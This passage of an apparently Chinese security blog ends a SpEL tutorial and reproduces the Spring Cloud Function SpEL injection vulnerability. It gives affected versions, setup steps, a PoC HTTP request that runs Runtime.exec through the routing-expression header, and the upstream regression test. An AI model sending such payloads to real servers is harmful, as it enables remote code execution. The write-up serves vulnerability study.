<h4 id="变量定义及引用"><a href="#变量定义及引用" class="headerlink" title="变量定义及引用"></a>变量定义及引用</h4><p>变量定义通过EvaluationContext接口的setVariable(variableName, value)方法定义；在表达式中使用<code>&quot;#variableName&quot;</code>引用；除了引用自定义变量，SpE还允许引用根对象及当前上下文对象，使用<code>&quot;#root&quot;</code>引用根对象，使用<code>&quot;#this&quot;</code>引用当前上下文对象</p>
<p><strong>Demo</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@Test</span><br><span class="line">    public void testVariableExpression() &#123;</span><br><span class="line">        ExpressionParser parser = new SpelExpressionParser();</span><br><span class="line">        EvaluationContext context = new StandardEvaluationContext();</span><br><span class="line">        context.setVariable(&quot;name&quot;, &quot;路人甲java&quot;);</span><br><span class="line">        context.setVariable(&quot;lesson&quot;, &quot;Spring系列&quot;);</span><br><span class="line"></span><br><span class="line">        //获取name变量，lesson变量</span><br><span class="line">        String name = parser.parseExpression(&quot;#name&quot;).getValue(context, String.class);</span><br><span class="line">        System.out.println(name);</span><br><span class="line">        String lesson = parser.parseExpression(&quot;#lesson&quot;).getValue(context, String.class);</span><br><span class="line">        System.out.println(lesson);</span><br><span class="line"></span><br><span class="line">        //StandardEvaluationContext构造器传入root对象，可以通过#root来访问root对象</span><br><span class="line">        context = new StandardEvaluationContext(&quot;我是root对象&quot;);</span><br><span class="line">        String rootObj = parser.parseExpression(&quot;#root&quot;).getValue(context, String.class);</span><br><span class="line">        System.out.println(rootObj);</span><br><span class="line"></span><br><span class="line">        //#this用来访问当前上线文中的对象</span><br><span class="line">        String thisObj = parser.parseExpression(&quot;#this&quot;).getValue(context, String.class);</span><br><span class="line">        System.out.println(thisObj);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>输出结果:</p>
<img src="/2022/03/05/SPEL%E8%A1%A8%E8%BE%BE%E5%BC%8F/image-20220424145136913.png" class title="image-20220424145136913">

<p>使用“#variable”来引用在EvaluationContext定义的变量；除了可以引用自定义变量，还可以使用“#root”引用根对象，“#this”引用当前上下文对象，此处“#this”即根对象</p>
<h4 id="自定义函数"><a href="#自定义函数" class="headerlink" title="自定义函数"></a>自定义函数</h4><p>目前只支持类静态方法注册为自定义函数；SpEL使用StandardEvaluationContext的registerFunction方法进行注册自定义函数，其实完全可以使用setVariable代替，两者其实本质是一样的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@Test</span><br><span class="line">    public void testFunctionExpression() throws SecurityException, NoSuchMethodException &#123;</span><br><span class="line">        //定义2个函数,registerFunction和setVariable都可以，不过从语义上面来看用registerFunction更恰当</span><br><span class="line">        StandardEvaluationContext context = new StandardEvaluationContext();</span><br><span class="line">        Method parseInt = Integer.class.getDeclaredMethod(&quot;parseInt&quot;, String.class);</span><br><span class="line">        context.registerFunction(&quot;parseInt1&quot;, parseInt);</span><br><span class="line">        context.setVariable(&quot;parseInt2&quot;, parseInt);</span><br><span class="line"></span><br><span class="line">        ExpressionParser parser = new SpelExpressionParser();</span><br><span class="line">        System.out.println(parser.parseExpression(&quot;#parseInt1(&#x27;3&#x27;)&quot;).getValue(context, int.class));</span><br><span class="line">        System.out.println(parser.parseExpression(&quot;#parseInt2(&#x27;3&#x27;)&quot;).getValue(context, int.class));</span><br><span class="line"></span><br><span class="line">        String expression1 = &quot;#parseInt1(&#x27;3&#x27;) == #parseInt2(&#x27;3&#x27;)&quot;;</span><br><span class="line">        boolean result1 = parser.parseExpression(expression1).getValue(context, boolean.class);</span><br><span class="line">        System.out.println(result1);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>输出结果:</p>
<img src="/2022/03/05/SPEL%E8%A1%A8%E8%BE%BE%E5%BC%8F/image-20220424153403507.png" class title="image-20220424153403507">

<h4 id="表达式赋值"><a href="#表达式赋值" class="headerlink" title="表达式赋值"></a>表达式赋值</h4><p>Demo</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@Test</span><br><span class="line">    public void testAssignExpression1() &#123;</span><br><span class="line">        Object user = new Object() &#123;</span><br><span class="line">            private String name;</span><br><span class="line"></span><br><span class="line">            public String getName() &#123;</span><br><span class="line">                return name;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            public void setName(String name) &#123;</span><br><span class="line">                this.name = name;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            @Override</span><br><span class="line">            public String toString() &#123;</span><br><span class="line">                return &quot;$classname&#123;&quot; +</span><br><span class="line">                        &quot;name=&#x27;&quot; + name + &#x27;\&#x27;&#x27; +</span><br><span class="line">                        &#x27;&#125;&#x27;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        &#123;</span><br><span class="line">            //user为root对象</span><br><span class="line">            ExpressionParser parser = new SpelExpressionParser();</span><br><span class="line">            EvaluationContext context = new StandardEvaluationContext(user);</span><br><span class="line">            parser.parseExpression(&quot;#root.name&quot;).setValue(context, &quot;路人甲java&quot;);</span><br><span class="line">            System.out.println(parser.parseExpression(&quot;#root&quot;).getValue(context, user.getClass()));</span><br><span class="line">        &#125;</span><br><span class="line">        &#123;</span><br><span class="line">            //user为变量</span><br><span class="line">            ExpressionParser parser = new SpelExpressionParser();</span><br><span class="line">            EvaluationContext context = new StandardEvaluationContext();</span><br><span class="line">            context.setVariable(&quot;user&quot;, user);</span><br><span class="line">            parser.parseExpression(&quot;#user.name&quot;).setValue(context, &quot;路人甲java&quot;);</span><br><span class="line">            System.out.println(parser.parseExpression(&quot;#user&quot;).getValue(context, user.getClass()));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>输出结果:</p>
<img src="/2022/03/05/SPEL%E8%A1%A8%E8%BE%BE%E5%BC%8F/image-20220424175245146.png" class title="image-20220424175245146">

<h4 id="对象属性存取及安全导航表达式"><a href="#对象属性存取及安全导航表达式" class="headerlink" title="对象属性存取及安全导航表达式"></a>对象属性存取及安全导航表达式</h4><p>对象属性获取非常简单，即使用如“a.property.property”这种点缀式获取，SpEL对于属性名首字母是不区分大小写的；SpEL还引入了Groovy语言中的安全导航运算符“**(对象|属性)?.属性**”，用来避免“?.”前边的表达式为null时抛出空指针异常，而是返回null；修改对象属性值则可以通过赋值表达式或Expression接口的setValue方法修改</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public static class Car &#123;</span><br><span class="line">        private String name;</span><br><span class="line"></span><br><span class="line">        public String getName() &#123;</span><br><span class="line">            return name;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        public void setName(String name) &#123;</span><br><span class="line">            this.name = name;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        @Override</span><br><span class="line">        public String toString() &#123;</span><br><span class="line">            return &quot;Car&#123;&quot; +</span><br><span class="line">                    &quot;name=&#x27;&quot; + name + &#x27;\&#x27;&#x27; +</span><br><span class="line">                    &#x27;&#125;&#x27;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static class User &#123;</span><br><span class="line">        private Car car;</span><br><span class="line"></span><br><span class="line">        public Car getCar() &#123;</span><br><span class="line">            return car;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        public void setCar(Car car) &#123;</span><br><span class="line">            this.car = car;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        @Override</span><br><span class="line">        public String toString() &#123;</span><br><span class="line">            return &quot;User&#123;&quot; +</span><br><span class="line">                    &quot;car=&quot; + car +</span><br><span class="line">                    &#x27;&#125;&#x27;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Test</span><br><span class="line">    public void test5() &#123;</span><br><span class="line">        User user = new User();</span><br><span class="line">        EvaluationContext context = new StandardEvaluationContext();</span><br><span class="line">        context.setVariable(&quot;user&quot;, user);</span><br><span class="line"></span><br><span class="line">        ExpressionParser parser = new SpelExpressionParser();</span><br><span class="line">        //使用.符号，访问user.car.name会报错，原因：user.car为空</span><br><span class="line">        try &#123;</span><br><span class="line">            System.out.println(parser.parseExpression(&quot;#user.car.name&quot;).getValue(context, String.class));</span><br><span class="line">        &#125; catch (EvaluationException | ParseException e) &#123;</span><br><span class="line">            System.out.println(&quot;出错了：&quot; + e.getMessage());</span><br><span class="line">        &#125;</span><br><span class="line">        //使用安全访问符号?.，可以规避null错误</span><br><span class="line">        System.out.println(parser.parseExpression(&quot;#user?.car?.name&quot;).getValue(context, String.class));</span><br><span class="line"></span><br><span class="line">        Car car = new Car();</span><br><span class="line">        car.setName(&quot;保时捷&quot;);</span><br><span class="line">        user.setCar(car);</span><br><span class="line"></span><br><span class="line">        System.out.println(parser.parseExpression(&quot;#user?.car?.toString()&quot;).getValue(context, String.class));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Test</span><br><span class="line">    public void test6() &#123;</span><br><span class="line">        DefaultListableBeanFactory factory = new DefaultListableBeanFactory();</span><br><span class="line">        User user = new User();</span><br><span class="line">        Car car = new Car();</span><br><span class="line">        car.setName(&quot;保时捷&quot;);</span><br><span class="line">        user.setCar(car);</span><br><span class="line">        factory.registerSingleton(&quot;user&quot;, user);</span><br><span class="line"></span><br><span class="line">        StandardEvaluationContext context = new StandardEvaluationContext();</span><br><span class="line">        context.setBeanResolver(new BeanFactoryResolver(factory));</span><br><span class="line"></span><br><span class="line">        ExpressionParser parser = new SpelExpressionParser();</span><br><span class="line">        User userBean = parser.parseExpression(&quot;@user&quot;).getValue(context, User.class);</span><br><span class="line">        System.out.println(userBean);</span><br><span class="line">        System.out.println(userBean == factory.getBean(&quot;user&quot;));</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>



<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://zhuanlan.zhihu.com/p/174786047">玩转Spring中强大的spel表达式！ - 知乎 (zhihu.com)</a></p>
<p><a href="https://www.jianshu.com/p/e0b50053b5d3">SpEL表达式总结 - 简书 (jianshu.com)</a></p>
]]></content>
      <categories>
        <category>内功心法</category>
        <category>java表达式</category>
      </categories>
      <tags>
        <tag>-OGNL -命令执行</tag>
      </tags>
  </entry>
  <entry>
    <title>Spring-Cloud-Function-SpEl注入漏洞复现分析</title>
    <url>/2022/03/04/Spring-Cloud-Function-SpEl%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<h1 id="Spring-Cloud-Function-SpEl注入漏洞复现分析"><a href="#Spring-Cloud-Function-SpEl注入漏洞复现分析" class="headerlink" title="Spring-Cloud-Function-SpEl注入漏洞复现分析"></a>Spring-Cloud-Function-SpEl注入漏洞复现分析</h1><p>在Spring框架的JDK9版本(及以上版本)中，该漏洞是由于Spring Cloud Function中RoutingFunction类的 apply方法将请求头中spring.cloud.function.routing-expression传入的参数值作为SPEL表 达式进行处理，攻击者可以通过构造恶意的语句来实现SPEL表达式注入</p>
<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><ul>
<li>3.0.0RELEASE&lt;&#x3D; Spring Cloud Function &lt;&#x3D;3.2.2</li>
</ul>
<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://github.com/Pizz33/Spring-Cloud-Function-SpEL</span><br></pre></td></tr></table></figure>

<p>使用idea新增spring intializr项目，并且选择与之相匹配的java版本</p>
<img src="/2022/03/04/Spring-Cloud-Function-SpEl%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20220401134932692.png" class title="image-20220401134932692">

<p>添加spring web和function</p>
<img src="/2022/03/04/Spring-Cloud-Function-SpEl%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20220401135057462.png" class title="image-20220401135057462">

<img src="/2022/03/04/Spring-Cloud-Function-SpEl%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20220401135111832.png" class title="image-20220401135111832">

<p>新建项目后右侧选择maven选择maven-package编译jar包</p>
<img src="/2022/03/04/Spring-Cloud-Function-SpEl%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20220401135632429.png" class title="image-20220401135632429">

<p>打包成功</p>
<img src="/2022/03/04/Spring-Cloud-Function-SpEl%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20220401135708884.png" class title="image-20220401135708884">

<p>运行打包好的jar包</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -jar demo-0.0.1-SNAPSHOT.jar</span><br></pre></td></tr></table></figure>

<img src="/2022/03/04/Spring-Cloud-Function-SpEl%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20220401135908045.png" class title="image-20220401135908045">

<p>浏览器访问8080端口，环境搭建成功</p>
<img src="/2022/03/04/Spring-Cloud-Function-SpEl%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20220401103338817.png" class title="image-20220401103338817">

<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="本地复现"><a href="#本地复现" class="headerlink" title="本地复现"></a>本地复现</h3><p><strong>poc</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /functionRouter HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:8080</span><br><span class="line">spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec(&quot;calc.exe&quot;)</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 4</span><br><span class="line"></span><br><span class="line">test</span><br></pre></td></tr></table></figure>

<p><strong>计算器执行成功</strong></p>
<img src="/2022/03/04/Spring-Cloud-Function-SpEl%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20220401113948882.png" class title="image-20220401113948882">

<p><strong>反弹shell</strong></p>
<img src="/2022/03/04/Spring-Cloud-Function-SpEl%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20220401141823947.png" class title="image-20220401141823947">

<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>在<a href="https://github.com/spring-cloud/spring-cloud-function/commit/0e89ee27b2e76138c16bcba6f4bca906c4f3744f">git提交描述</a>中，明确指出修复了<code>RoutingFunction</code> SpEL代码注入漏洞，并且可以看到目前只更新了两个文件，其中一个文件仅为单元测试.</p>
<p>测试用例代码如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/*</span><br><span class="line"> * Copyright 2019-2019 the original author or authors.</span><br><span class="line"> *</span><br><span class="line"> * Licensed under the Apache License, Version 2.0 (the &quot;License&quot;);</span><br><span class="line"> * you may not use this file except in compliance with the License.</span><br><span class="line"> * You may obtain a copy of the License at</span><br><span class="line"> *</span><br><span class="line"> *      https://www.apache.org/licenses/LICENSE-2.0</span><br><span class="line"> *</span><br><span class="line"> * Unless required by applicable law or agreed to in writing, software</span><br><span class="line"> * distributed under the License is distributed on an &quot;AS IS&quot; BASIS,</span><br><span class="line"> * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.</span><br><span class="line"> * See the License for the specific language governing permissions and</span><br><span class="line"> * limitations under the License.</span><br><span class="line"> */</span><br><span class="line">package org.springframework.cloud.function.context.config;</span><br><span class="line">import java.util.function.Function;</span><br><span class="line">import org.junit.jupiter.api.AfterEach;</span><br><span class="line">import org.junit.jupiter.api.Assertions;</span><br><span class="line">import org.junit.jupiter.api.Test;</span><br><span class="line">import reactor.core.publisher.Flux;</span><br><span class="line">import reactor.test.StepVerifier;</span><br><span class="line">import org.springframework.boot.autoconfigure.EnableAutoConfiguration;</span><br><span class="line">import org.springframework.boot.builder.SpringApplicationBuilder;</span><br><span class="line">import org.springframework.cloud.function.context.FunctionCatalog;</span><br><span class="line">import org.springframework.cloud.function.context.FunctionProperties;</span><br><span class="line">import org.springframework.context.ConfigurableApplicationContext;</span><br><span class="line">import org.springframework.context.annotation.Bean;</span><br><span class="line">import org.springframework.context.annotation.Configuration;</span><br><span class="line">import org.springframework.messaging.Message;</span><br><span class="line">import org.springframework.messaging.support.MessageBuilder;</span><br><span class="line"></span><br><span class="line">import static org.assertj.core.api.Assertions.assertThat;</span><br><span class="line">import static org.junit.Assert.fail;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> *</span><br><span class="line"> * @author Oleg Zhurakousky</span><br><span class="line"> *</span><br><span class="line"> */</span><br><span class="line">public class RoutingFunctionTests &#123;</span><br><span class="line">	private ConfigurableApplicationContext context;</span><br><span class="line">	@AfterEach</span><br><span class="line">	public void before() &#123;</span><br><span class="line">		System.clearProperty(&quot;spring.cloud.function.definition&quot;);</span><br><span class="line">		System.clearProperty(&quot;spring.cloud.function.routing-expression&quot;);</span><br><span class="line">		context.close();</span><br><span class="line">	&#125;</span><br><span class="line">	private FunctionCatalog configureCatalog() &#123;</span><br><span class="line">		context = new SpringApplicationBuilder(RoutingFunctionConfiguration.class).run(</span><br><span class="line">				&quot;--logging.level.org.springframework.cloud.function=DEBUG&quot;,</span><br><span class="line">				&quot;--spring.cloud.function.routing.enabled=true&quot;);</span><br><span class="line">		return context.getBean(FunctionCatalog.class);</span><br><span class="line">	&#125;</span><br><span class="line">	@SuppressWarnings(&#123; &quot;unchecked&quot;, &quot;rawtypes&quot; &#125;)</span><br><span class="line">	@Test</span><br><span class="line">	public void testInvocationWithMessageAndHeader() &#123;</span><br><span class="line">		FunctionCatalog functionCatalog = this.configureCatalog();</span><br><span class="line">		Function function = functionCatalog.lookup(RoutingFunction.FUNCTION_NAME);</span><br><span class="line">		assertThat(function).isNotNull();</span><br><span class="line">		Message&lt;String&gt; message = MessageBuilder.withPayload(&quot;hello&quot;)</span><br><span class="line">				.setHeader(FunctionProperties.PREFIX + &quot;.definition&quot;, &quot;reverse&quot;).build();</span><br><span class="line">		assertThat(function.apply(message)).isEqualTo(&quot;olleh&quot;);</span><br><span class="line">	&#125;</span><br><span class="line">	@SuppressWarnings(&#123; &quot;unchecked&quot;, &quot;rawtypes&quot; &#125;)</span><br><span class="line">	@Test</span><br><span class="line">	public void testRoutingSimpleInputWithReactiveFunctionWithMessageHeader() &#123;</span><br><span class="line">		FunctionCatalog functionCatalog = this.configureCatalog();</span><br><span class="line">		Function function = functionCatalog.lookup(RoutingFunction.FUNCTION_NAME);</span><br><span class="line">		assertThat(function).isNotNull();</span><br><span class="line">		Message&lt;String&gt; message = MessageBuilder.withPayload(&quot;hello&quot;)</span><br><span class="line">				.setHeader(FunctionProperties.PREFIX + &quot;.definition&quot;, &quot;echoFlux&quot;).build();</span><br><span class="line">		assertThat(((Flux) function.apply(message)).blockFirst()).isEqualTo(&quot;hello&quot;);</span><br><span class="line">	&#125;</span><br><span class="line">	@SuppressWarnings(&#123; &quot;unchecked&quot;, &quot;rawtypes&quot; &#125;)</span><br><span class="line">	@Test</span><br><span class="line">	public void testRoutingReactiveInputWithReactiveFunctionAndDefinitionMessageHeader() &#123;</span><br><span class="line">		FunctionCatalog functionCatalog = this.configureCatalog();</span><br><span class="line">		Function function = functionCatalog.lookup(RoutingFunction.FUNCTION_NAME);</span><br><span class="line">		assertThat(function).isNotNull();</span><br><span class="line">		Message&lt;String&gt; message = MessageBuilder.withPayload(&quot;hello&quot;)</span><br><span class="line">				.setHeader(FunctionProperties.PREFIX + &quot;.definition&quot;, &quot;echoFlux&quot;).build();</span><br><span class="line">		Flux resultFlux = (Flux) function.apply(Flux.just(message));</span><br><span class="line"></span><br><span class="line">		StepVerifier</span><br><span class="line">		.create(resultFlux)</span><br><span class="line">		.expectError()</span><br><span class="line">		.verify();</span><br><span class="line">		StepVerifier.create(resultFlux).expectError().verify();</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	@SuppressWarnings(&#123; &quot;unchecked&quot;, &quot;rawtypes&quot; &#125;)</span><br><span class="line">	@Test</span><br><span class="line">	public void testRoutingReactiveInputWithReactiveFunctionAndExpressionMessageHeader() &#123;</span><br><span class="line">		FunctionCatalog functionCatalog = this.configureCatalog();</span><br><span class="line">		Function function = functionCatalog.lookup(RoutingFunction.FUNCTION_NAME);</span><br><span class="line">		assertThat(function).isNotNull();</span><br><span class="line">		Message&lt;String&gt; message = MessageBuilder.withPayload(&quot;hello&quot;)</span><br><span class="line">				.setHeader(FunctionProperties.PREFIX + &quot;.routing-expression&quot;, &quot;&#x27;echoFlux&#x27;&quot;).build();</span><br><span class="line">		Flux resultFlux = (Flux) function.apply(Flux.just(message));</span><br><span class="line">		StepVerifier</span><br><span class="line">		.create(resultFlux)</span><br><span class="line">		.expectError()</span><br><span class="line">		.verify();</span><br><span class="line">		StepVerifier.create(resultFlux).expectError().verify();</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	@SuppressWarnings(&#123; &quot;unchecked&quot;, &quot;rawtypes&quot; &#125;)</span><br><span class="line">	@Test</span><br><span class="line">	public void failWithHeaderProvidedExpressionAccessingRuntime() &#123;</span><br><span class="line">		FunctionCatalog functionCatalog = this.configureCatalog();</span><br><span class="line">		Function function = functionCatalog.lookup(RoutingFunction.FUNCTION_NAME);</span><br><span class="line">		assertThat(function).isNotNull();</span><br><span class="line">		Message&lt;String&gt; message = MessageBuilder.withPayload(&quot;hello&quot;)</span><br><span class="line">				.setHeader(FunctionProperties.PREFIX + &quot;.routing-expression&quot;,</span><br><span class="line">						&quot;T(java.lang.Runtime).getRuntime().exec(\&quot;open -a calculator.app\&quot;)&quot;)</span><br><span class="line">				.build();</span><br><span class="line">		try &#123;</span><br><span class="line">			function.apply(message);</span><br><span class="line">			fail();</span><br><span class="line">		&#125;</span><br><span class="line">		catch (Exception e) &#123;</span><br><span class="line">			assertThat(e.getMessage()).isEqualTo(&quot;EL1005E: Type cannot be found &#x27;java.lang.Runtime&#x27;&quot;);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	@SuppressWarnings(&#123; &quot;unchecked&quot;, &quot;rawtypes&quot; &#125;)</span><br><span class="line">	@Test</span><br><span class="line">	public void testInvocationWithMessageAndDefinitionProperty() &#123;</span><br><span class="line">		System.setProperty(FunctionProperties.PREFIX + &quot;.definition&quot;, &quot;reverse&quot;);</span><br><span class="line">		FunctionCatalog functionCatalog = this.configureCatalog();</span><br><span class="line">		Function function = functionCatalog.lookup(RoutingFunction.FUNCTION_NAME);</span><br><span class="line">		assertThat(function).isNotNull();</span><br><span class="line">		Message&lt;String&gt; message = MessageBuilder.withPayload(&quot;hello&quot;).build();</span><br><span class="line">		assertThat(function.apply(message)).isEqualTo(&quot;olleh&quot;);</span><br><span class="line">	&#125;</span><br><span class="line">	@SuppressWarnings(&#123; &quot;unchecked&quot;, &quot;rawtypes&quot; &#125;)</span><br><span class="line">	@Test</span><br><span class="line">	public void testInvocationWithMessageAndRoutingExpression() &#123;</span><br><span class="line">		System.setProperty(FunctionProperties.PREFIX + &quot;.routing-expression&quot;, &quot;headers.function_name&quot;);</span><br><span class="line">		FunctionCatalog functionCatalog = this.configureCatalog();</span><br><span class="line">		Function function = functionCatalog.lookup(RoutingFunction.FUNCTION_NAME);</span><br><span class="line">		assertThat(function).isNotNull();</span><br><span class="line">		Message&lt;String&gt; message = MessageBuilder.withPayload(&quot;hello&quot;).setHeader(&quot;function_name&quot;, &quot;reverse&quot;).build();</span><br><span class="line">		assertThat(function.apply(message)).isEqualTo(&quot;olleh&quot;);</span><br><span class="line">	&#125;</span><br><span class="line">	@SuppressWarnings(&#123; &quot;unchecked&quot;, &quot;rawtypes&quot; &#125;)</span><br><span class="line">	@Test</span><br><span class="line">	public void testInvocationWithMessageAndRoutingExpressionCaseInsensitive() &#123;</span><br><span class="line">		System.setProperty(FunctionProperties.PREFIX + &quot;.routing-expression&quot;, &quot;headers.function_Name&quot;);</span><br><span class="line">		FunctionCatalog functionCatalog = this.configureCatalog();</span><br><span class="line">		Function function = functionCatalog.lookup(RoutingFunction.FUNCTION_NAME);</span><br><span class="line">		assertThat(function).isNotNull();</span><br><span class="line">		Message&lt;String&gt; message = MessageBuilder.withPayload(&quot;hello&quot;).setHeader(&quot;function_name&quot;, &quot;reverse&quot;).build();</span><br><span class="line">		assertThat(function.apply(message)).isEqualTo(&quot;olleh&quot;);</span><br><span class="line">		System.setProperty(FunctionProperties.PREFIX + &quot;.routing-expression&quot;, &quot;headers.FunCtion_namE&quot;);</span><br><span class="line">		assertThat(function.apply(message)).isEqualTo(&quot;olleh&quot;);</span><br><span class="line">	&#125;</span><br><span class="line">	@SuppressWarnings(&#123; &quot;rawtypes&quot;, &quot;unchecked&quot; &#125;)</span><br><span class="line">	@Test</span><br><span class="line">	public void testInvocationWithRoutingBeanExpression() &#123;</span><br><span class="line">		System.setProperty(FunctionProperties.PREFIX + &quot;.routing-expression&quot;, &quot;@reverse.apply(#root.getHeaders().get(&#x27;func&#x27;))&quot;);</span><br><span class="line">		System.setProperty(FunctionProperties.PREFIX + &quot;.routing-expression&quot;,</span><br><span class="line">				&quot;@reverse.apply(#root.getHeaders().get(&#x27;func&#x27;))&quot;);</span><br><span class="line">		FunctionCatalog functionCatalog = this.configureCatalog();</span><br><span class="line">		Function function = functionCatalog.lookup(RoutingFunction.FUNCTION_NAME);</span><br><span class="line">		assertThat(function).isNotNull();</span><br><span class="line">		Message&lt;String&gt; message = MessageBuilder.withPayload(&quot;hello&quot;).setHeader(&quot;func&quot;, &quot;esacreppu&quot;).build();</span><br><span class="line">		assertThat(function.apply(message)).isEqualTo(&quot;HELLO&quot;);</span><br><span class="line">	&#125;</span><br><span class="line">	@SuppressWarnings(&#123; &quot;rawtypes&quot;, &quot;unchecked&quot; &#125;)</span><br><span class="line">	@Test</span><br><span class="line">	public void testOtherExpectedFailures() &#123;</span><br><span class="line">		FunctionCatalog functionCatalog = this.configureCatalog();</span><br><span class="line">		Function function = functionCatalog.lookup(RoutingFunction.FUNCTION_NAME);</span><br><span class="line">		// no function.definition header or function property</span><br><span class="line">		try &#123;</span><br><span class="line">			function.apply(MessageBuilder.withPayload(&quot;hello&quot;).build());</span><br><span class="line">			Assertions.fail();</span><br><span class="line">		&#125;</span><br><span class="line">		catch (Exception e) &#123;</span><br><span class="line">			//ignore</span><br><span class="line">			// ignore</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		// non existing function</span><br><span class="line">		try &#123;</span><br><span class="line">			function.apply(MessageBuilder.withPayload(&quot;hello&quot;).setHeader(FunctionProperties.PREFIX + &quot;.definition&quot;, &quot;blah&quot;).build());</span><br><span class="line">			function.apply(MessageBuilder.withPayload(&quot;hello&quot;)</span><br><span class="line">					.setHeader(FunctionProperties.PREFIX + &quot;.definition&quot;, &quot;blah&quot;).build());</span><br><span class="line">			Assertions.fail();</span><br><span class="line">		&#125;</span><br><span class="line">		catch (Exception e) &#123;</span><br><span class="line">			//ignore</span><br><span class="line">			// ignore</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	@SuppressWarnings(&#123; &quot;rawtypes&quot;, &quot;unchecked&quot; &#125;)</span><br><span class="line">	@Test</span><br><span class="line">	public void testInvocationWithMessageComposed() &#123;</span><br><span class="line">		FunctionCatalog functionCatalog = this.configureCatalog();</span><br><span class="line">		Function function = functionCatalog.lookup(RoutingFunction.FUNCTION_NAME + &quot;|reverse&quot;);</span><br><span class="line">		assertThat(function).isNotNull();</span><br><span class="line">		Message&lt;String&gt; message = MessageBuilder.withPayload(&quot;hello&quot;)</span><br><span class="line">				.setHeader(FunctionProperties.PREFIX + &quot;.definition&quot;, &quot;uppercase&quot;).build();</span><br><span class="line">		assertThat(function.apply(message)).isEqualTo(&quot;OLLEH&quot;);</span><br><span class="line">	&#125;</span><br><span class="line">	@EnableAutoConfiguration</span><br><span class="line">	@Configuration</span><br><span class="line">	protected static class RoutingFunctionConfiguration &#123;</span><br><span class="line">		@Bean</span><br><span class="line">		public Function&lt;String, String&gt; reverse() &#123;</span><br><span class="line">			return v -&gt; new StringBuilder(v).reverse().toString();</span><br><span class="line">		&#125;</span><br><span class="line">		@Bean</span><br><span class="line">		public Function&lt;String, String&gt; uppercase() &#123;</span><br><span class="line">			return String::toUpperCase;</span><br><span class="line">		&#125;</span><br><span class="line">		@Bean</span><br><span class="line">		public Function&lt;Flux&lt;String&gt;, Flux&lt;String&gt;&gt; echoFlux() &#123;</span><br><span class="line">			return f -&gt; f;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>位于 RoutingFunctionTests.java 的128行，可以清楚地看出Http头部构造方式,在给<code>Spring Cloud Function</code>的web服务发送包的时候，加一个相关的Header信息，然后跟入SpEL表达式即可执行命令。</p>
